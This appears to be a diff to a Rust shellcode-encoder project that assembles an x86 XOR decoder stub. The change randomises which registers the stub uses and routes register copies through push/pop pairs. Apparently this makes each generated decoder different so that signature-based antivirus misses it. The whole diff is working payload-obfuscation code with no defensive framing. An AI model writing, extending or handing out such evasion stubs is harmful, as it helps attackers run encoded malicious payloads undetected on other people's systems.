@@ -18,38 +18,76 @@ use dynasmrt::{dynasm, x64::X64Relocation, x86::X86Relocation, DynasmApi, Dynasm
 use rand::Rng;
 
 use crate::{obfuscation::{x32::X32CodeAssembler, x64::X64CodeAssembler}, xor_dynamic::encoder::{XorDynamicEncoderError, XorDynamicStub}};
+use crate::x64_arch::registers::{get_save_random_general_purpose_register, RBP_FULL, RCX_FULL, RSP_FULL};
 
 impl<RngType: Rng> XorDynamicStub for X32CodeAssembler<RngType> {
-    fn get_decoder_stub(&self) -> Result<Vec<u8>, XorDynamicEncoderError> {
+    fn get_decoder_stub(&mut self) -> Result<Vec<u8>, XorDynamicEncoderError> {
         let mut assembler = VecAssembler::<X86Relocation>::new(0);
+        let link_register = get_save_random_general_purpose_register(&[RBP_FULL, RSP_FULL], &mut self.rng);
+        let link_register_id = link_register.quad as u8;
+
+        let jmp_register = get_save_random_general_purpose_register(
+            &[RBP_FULL, RSP_FULL, link_register.clone()],
+            &mut self.rng,
+        );
+        let jmp_register_id = jmp_register.quad as u8;
+
+        let payload_indexer_register = get_save_random_general_purpose_register(
+            &[
+                RCX_FULL,
+                RBP_FULL,
+                RSP_FULL,
+                link_register.clone(),
+                jmp_register.clone(),
+            ],
+            &mut self.rng,
+        );
+        let payload_indexer_register_id = payload_indexer_register.quad as u8;
+
+        let key_indexer_register = get_save_random_general_purpose_register(
+            &[
+                RCX_FULL,
+                RBP_FULL,
+                RSP_FULL,
+                link_register.clone(),
+                jmp_register.clone(),
+                payload_indexer_register.clone(),
+            ],
+            &mut self.rng,
+        );
+        let key_indexer_register_id = key_indexer_register.quad as u8;
+
         dynasm!(assembler
             ; .arch x86
-            ; jmp >_call
-            ; _ret:
-            ; pop ebx
-            ; mov edi, ebx
+            ; jmp >call_label
+            ; ret_label:
+            ; pop Rd(link_register_id)
+            ; push Rd(link_register_id)
+            ; pop Rd(payload_indexer_register_id)
             ; mov al, 'A' as i8
             ; cld
-            ; _lp1:
+            ; lp1:
             ; scasb
-            ; jne <_lp1
-            ; mov ecx, edi
-            ; _lp2:
-            ; mov esi, ebx
-            ; _lp3:
-            ; mov al, BYTE [esi]
-            ; xor BYTE [edi], al
-            ; inc edi
-            ; cmp WORD [edi], 0x4242
-            ; je >_jmp
-            ; inc esi
-            ; cmp BYTE [esi], 'A' as i8
-            ; jne <_lp3
-            ; jmp <_lp2
-            ; _jmp:
-            ; jmp ecx
-            ; _call:
-            ; call <_ret
+            ; jne <lp1
+            ; push Rd(payload_indexer_register_id)
+            ; pop Rd(jmp_register_id)
+            ; lp2:
+            ; push Rd(link_register_id)
+            ; pop Rd(key_indexer_register_id)
+            ; lp3:
+            ; mov al, BYTE [Rd(key_indexer_register_id)]
+            ; xor BYTE [Rd(payload_indexer_register_id)], al
+            ; inc Rd(payload_indexer_register_id)
+            ; inc Rd(key_indexer_register_id)
+            ; cmp WORD [Rd(payload_indexer_register_id)], 0x4242
+            ; je >jmp_label
+            ; cmp BYTE [Rd(key_indexer_register_id)], 'A' as i8
+            ; jne <lp3
+            ; jmp <lp2
+            ; jmp_label:
+            ; jmp Rd(jmp_register_id)
+            ; call_label:
+            ; call <ret_label
         );
 
         let bytes = assembler.finalize()?;
